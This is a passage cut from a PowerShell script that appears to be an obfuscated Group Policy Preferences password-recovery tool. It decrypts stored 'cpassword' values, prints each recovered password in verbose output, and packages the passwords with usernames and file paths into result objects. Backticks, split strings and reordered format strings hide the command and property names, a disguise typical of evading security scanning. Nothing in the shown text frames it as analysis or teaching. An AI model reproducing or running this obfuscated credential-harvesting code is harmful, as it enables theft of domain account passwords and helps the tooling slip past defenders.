                    }
                }
           }
                     
           foreach (${pa`SS} in ${C`PAsSwo`RD}) {
               &('Wri'+'te'+'-Verbose') ('D'+'e'+'crypting'+' '+"$Pass")
               ${D`E`cRYPtEDp`AsSWo`RD} = &('Get-De'+'cr'+'y'+'pt'+'ed'+'Cpassword') ${pa`SS}
               &('Write-Ve'+'r'+'b'+'ose') ('Decryp'+'ted'+' '+'a '+'p'+'ass'+'word '+'o'+'f '+"$DecryptedPassword")
               
               ${p`A`SSWOrd} += , ${DeC`R`yPtedpasSw`o`RD}
           }
            
            
            if (-not ${PA`sS`WoRD}) {${P`A`SSWOrD} = ("{0}{1}" -f'[','BLANK]')}
            if (-not ${U`seR`NAME}) {${U`sErN`AME} = ("{1}{0}{2}"-f'N','[BLA','K]')}
            if (-not ${ch`ANg`Ed})  {${Cha`NG`Ed} = ("{1}{0}{2}" -f 'BLAN','[','K]')}
            if (-not ${new`NA`Me})  {${N`Ewn`AmE} = ("{0}{1}{2}"-f'[B','LA','NK]')}
                  
            
            ${o`B`JECtprOPEr`TI`Es} = @{("{2}{1}{0}" -f 'ds','sswor','Pa') = ${P`A`SsWOrD};
                                  ("{1}{0}" -f'mes','UserNa') = ${us`ErNa`me};
                                  ("{1}{2}{0}"-f 'ed','Chan','g') = ${C`HAnG`ED};
                                  ("{0}{1}"-f 'New','Name') = ${n`EwNA`Me};
                                  ("{1}{0}" -f 'e','Fil') = ${FI`le}}
                
